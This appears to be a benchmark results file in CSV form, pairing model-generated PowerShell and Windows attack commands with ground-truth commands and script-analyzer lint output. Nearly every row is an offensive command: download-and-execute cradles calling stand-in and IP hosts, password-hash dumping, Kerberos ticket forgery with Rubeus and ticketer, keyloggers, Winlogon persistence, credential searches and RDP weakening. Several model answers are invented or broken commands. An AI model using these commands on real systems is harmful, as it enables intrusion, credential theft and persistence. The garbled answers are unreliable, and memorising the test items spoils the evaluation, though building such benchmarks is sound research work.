Answer,Ground Truth,ANSWER Rulename,ANSWER Message,ANSWER Severity,TRUTH Rulename,TRUTH Message,TRUTH Severity
"powershell.exe -nop -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/exeKern32.ps1')""","powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""IEX (Invoke-WebRequest -Uri 'http://HeavySite.com/script.ps1').Content""",[''],[''],[''],[''],[''],['']
net use \\${remote.host.fqdn}\C$ /user:${domain.user.name} ${domain.user.password},net view \\${remote.host.fqdn} /all,[''],[''],[''],[''],[''],['']
"Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Winlogon"" -Name Winlogon -Value ""${value}""","Set-ItemProperty ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Shell"" ""explorer.exe, ${binaryToExec}"" -Force",[''],[''],[''],['PSAvoidUsingPositionalParameters '],"[""Cmdlet 'Set-ItemProperty' has positional parameter. Please use named parameters instead of positional parameters when calling a command. ""]",['Information']
Invoke-Command -ComputerName <target> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://example.com/sysHack.ps1')},Invoke-Command -ComputerName <target> -ScriptBlock { Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil-web.site/superbad.ps1') },"['RedirectionNotSupported ', ' PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","[""The '<' operator is reserved for future use. "", ' Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['ParseError ', ' Warning ', ' Warning']","['RedirectionNotSupported ', ' PSAvoidUsingInvokeExpression ']","[""The '<' operator is reserved for future use. "", ' Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ']","['ParseError ', ' Warning']"
gpresult /R,dir,[''],[''],[''],['PSAvoidUsingCmdletAliases '],"[""'dir' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning']
$cert = ${path} ; MoveTo-Storage -Path $cert,"$cert = Import-Certificate -FilePath ${pfx_path} -CertStoreLocation Cert:\LocalMachine\My ; Move-Item -Path $cert.PSPath -Destination ""Cert:\LocalMachine\Root""",[''],[''],[''],[''],[''],['']
Invoke-CimMethod -ClassName Win32_Product -MethodName ${action} -Arguments @{ PackageLocation = '${MSIPayload}' },Invoke-CimMethod -ClassName Win32_Product -MethodName ${action} -Arguments @{ PackageLocation = '${msi_Payload}' },[''],[''],[''],[''],[''],['']
Invoke-ExecuteMSBuild -Execute 'iex(New-Object Net.WebClient).DownloadString('http://www.getyourpowershellhere.com/payload')',Invoke-ExecuteMSBuild,[''],[''],[''],[''],[''],['']
$process = Get-Process -Name 'cmd.exe' ; Invoke-TokenManipulation -CreateProcess $process.id,Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe',[''],[''],[''],[''],[''],['']
Get-Domain,Get-Domain,[''],[''],[''],[''],[''],['']
lookupsid.py < child_domain>/username@10.10.10.10 | hash-childitem -child_domain ${child_domain} -root_id ${root_id},ticketer.py -nthash < krbtgt_hash> -domain < child_domain> -domain-sid < child_domain_sid> -extra-sid < root_domain_sid> Administrator,['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError'],"['RedirectionNotSupported ', ' RedirectionNotSupported ', ' RedirectionNotSupported ', ' RedirectionNotSupported ']","[""The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. ""]","['ParseError ', ' ParseError ', ' ParseError ', ' ParseError']"
gci HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name 'password' -Value 'sensitive',"$pattern = ""password"";$hives = ""HKEY_CLASSES_ROOT"",""HKEY_CURRENT_USER"",""HKEY_LOCAL_MACHINE"",""HKEY_USERS"",""HKEY_CURRENT_CONFIG"";foreach ($r in $hives) { gci ""registry::${r}\"" -rec -ea SilentlyContinue | sls ""$pattern"" };foreach ($r in $hives) { gci ""registry::${r}\"" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match ""$pattern"") { $_.PsPath; $_ | out-string -stream | sls ""$pattern"" }}}",['PSAvoidUsingCmdletAliases '],"[""'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning'],"['PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'sls' is an alias of 'Select-String'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" '%' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'gp' is an alias of 'Get-ItemProperty'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'sls' is an alias of 'Select-String'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning']"
Get-PSSession -Name doublehopsess -RunAsCredential domain_name\username,Enter-PSSession -ConfigurationName doublehopsess -ComputerName < pc_name> -Credential domain_name\username,[''],[''],[''],['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
$o = 'Get'; $b = 'Process'; $cmd = $o + '-' + $b; Invoke-Expression $cmd,$originalString = 'SensitiveCommand'; $obfuscatedString = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($originalString)); $decodedString = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($obfuscatedString)); InvokeExpression $decodedString,['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],[''],[''],['']
nishang.exe -dump localpassword,"iex(iwr(""https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1""));Get-PassHashes",[''],[''],[''],"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'iex' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'iwr' is an alias of 'Invoke-WebRequest'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning ', ' Warning']"
$renamed = 'Get-Process'; Set-Alias -Name $renamed -Value Get-ChildItem; Invoke-Expression $renamed,Function MyGetProc { Get-Process }; MyGetProc,['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],[''],[''],['']
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap,Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap,[''],[''],[''],[''],[''],['']
"Get-ADPrincipal -Instance ""dcorp-mssql.dollarcorp.moneycorp.local""","Invoke-SQLEscalatePriv -Verbose -Instance ""SQLServer1\Instance1""",[''],[''],[''],[''],[''],['']
Get-GPO -ClassName win32_operatingsystem | select * | more,Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}',['PSAvoidUsingCmdletAliases '],"[""'select' is an alias of 'Select-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning'],[''],[''],['']
$PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.txt,$path = 'C:\temp\keystrokes.txt'; Add-Type -AssemblyName System.Windows.Forms; $listener = New-Object System.Windows.Forms.Keylogger; [System.Windows.Forms.Application]::Run($listener); $listener.Keys | Out-File -FilePath $path,['UnexpectedToken '],"[""Unexpected token '\\T1056.001\\src\\Get-Keystrokes.txt' in expression or statement. ""]",['ParseError'],[''],[''],['']
netsh http show full,netsh interface portproxy add v4tov4 listenport=5446 listenaddress=10.35.8.17 connectport=5985 connectaddress=10.35.8.23,[''],[''],[''],[''],[''],['']
"gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern 'password'","gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern ""password""",['PSAvoidUsingCmdletAliases '],"[""'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning'],['PSAvoidUsingCmdletAliases '],"[""'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning']
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname,Find-DomainShare -CheckShareAccess,[''],[''],[''],[''],[''],['']
gpresult /R,"$net = ""10.10.1."";0..255 | foreach {$r=(Resolve-DNSname -ErrorAction SilentlyContinue $net$_ | ft NameHost -HideTableHeaders | Out-String).trim().replace(""\s+"","""").replace(""`r"","""").replace(""`n"","" ""); Write-Output ""$net$_ $r""} | tee ip_hostname.txt",[''],[''],[''],"['PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""'foreach' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'ft' is an alias of 'Format-Table'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'tee' is an alias of 'Tee-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning ', ' Warning']"
"Get-DomainController -Identity ""Administrator"" -Verbose",raiseChild.py -target-exec 10.10.10.10 <child_domain>/username,[''],[''],[''],['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
"$shared = New-SmbShare -Name ""sharedir"" -Force","new-item ""c:\users\public\share"" -itemtype directory;New-SmbShare -Name ""sharedir"" -Path ""C:\users\public\share"" -FullAccess ""Everyone"",""Guests"",""Anonymous Logon""",['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'shared' is assigned but never used. ""]",['Warning'],[''],[''],['']
$data = Get-Content; Invoke-Expression $data,$content = 'Invoke-Mimikatz'; $file = 'C:\temp\normal.txt'; $stream = 'C:\temp\normal.txt:hidden'; SetContent -Path $file -Value 'This is a normal file'; Add-Content -Path $stream -Value $content; GetContent -Path $stream,['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],[''],[''],['']
gpresult /R,([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value,[''],[''],[''],[''],[''],['']
$o = 'Get'; $b = 'Process'; $cmd = $o + '-' + $b; Invoke-Expression $cmd,$path = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVGVtcFxBZG1pblRvb2xz')); Invoke-Item $path,['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],[''],[''],['']
$content = Get-Content; Invoke-Expression $content,$code = [System.IO.File]::ReadAllText('C:\temp\script.ps1'); Invoke-Expression $code,['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
"(Get-WmiObject -Class ""Win32_TerminalServiceSetting"" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1)","(Get-WmiObject -class ""Win32_TSGeneralSetting"" -Namespace root\cimv2\terminalservices -Filter ""TerminalName='RDP-tcp'"").SetUserAuthenticationRequired(0)",['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning']
"Get-ForestGlobalCatalog -Forest external.domain ; Get-DomainTrust -SearchBase ""GC://$($ENV:USERDNSDOMAIN)""",Get-ForestGlobalCatalog,[''],[''],[''],[''],[''],['']
Invoke-Keystrokes -CheckAll,"Add-Type -TypeDefinition @"" using System; using System.Runtime.InteropServices; public class KeyLogger { [DllImport(""user32.dll"")] public static extern int GetAsyncKeyState(Int32 i); } ""@ while ($true) { Start-Sleep -Milliseconds 100 for ($i = 8; $i -le 190; $i++) { if ([KeyLogger]::GetAsyncKeyState($i) eq -32767) { $Key = [System.Enum]::GetName([System.Windows.Forms.Keys], $i) Write-Host $Key } } }",[''],[''],[''],"['UnexpectedCharactersAfterHereStringHeader ', ' MissingEndParenthesisInExpression ', ' MissingEndCurlyBrace ', ' UnexpectedToken ', ' UnexpectedToken ', ' MissingEndParenthesisAfterStatement ', ' MissingEndCurlyBrace ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' PSAvoidUsingPositionalParameters ']","['No characters are allowed after a here-string header but before the end of the line. ', "" Missing closing ')' in expression. "", "" Missing closing '}' in statement block or type definition. "", "" Unexpected token ')' in expression or statement. "", "" Unexpected token 'eq' in expression or statement. "", "" Missing closing ')' after expression in 'if' statement. "", "" Missing closing '}' in statement block or type definition. "", "" Unexpected token ')' in expression or statement. "", "" Unexpected token 'Write-Host' in expression or statement. "", "" Unexpected token '}' in expression or statement. "", "" Unexpected token '}' in expression or statement. "", "" Cmdlet 'Add-Type' has positional parameter. Please use named parameters instead of positional parameters when calling a command. ""]","['ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' Information']"
"$code = 'Invoke-Expression -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/malicious-code.ps1')""","Add-Type -TypeDefinition 'using System; public class MyClass { public static void Run() { Console.WriteLine(""Executed""); } }'; [MyClass]::Run()","['TerminatorExpectedAtEndOfString ', ' UnexpectedToken ', ' PSUseDeclaredVarsMoreThanAssignments ']","[""The string is missing the terminator: '. "", ' Unexpected token \'http://malicious-site.com/malicious-code.ps1\')""\' in expression or statement. ', "" The variable 'code' is assigned but never used. ""]","['ParseError ', ' ParseError ', ' Warning']",[''],[''],['']
"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""Invoke-AzplhG9txdFhS9n""",powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');,[''],[''],[''],"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
"(Get-WmiObject -Class ""Win32_TerminalServiceSetting"" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1)","Get-NetFirewallRule -DisplayGroup ""Remote Desktop"" | Set-NetFirewallRule -Enabled True",['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],[''],[''],['']
Get-SQLInstanceDomain | Get-SQLConnectionTest | Test-SQLConnectionTestInfo -Verbose,"Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq ""Accessible"" } | Get-SQLServerInfo",[''],[''],[''],['PSAvoidUsingCmdletAliases '],"[""'?' is an alias of 'Where-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning']
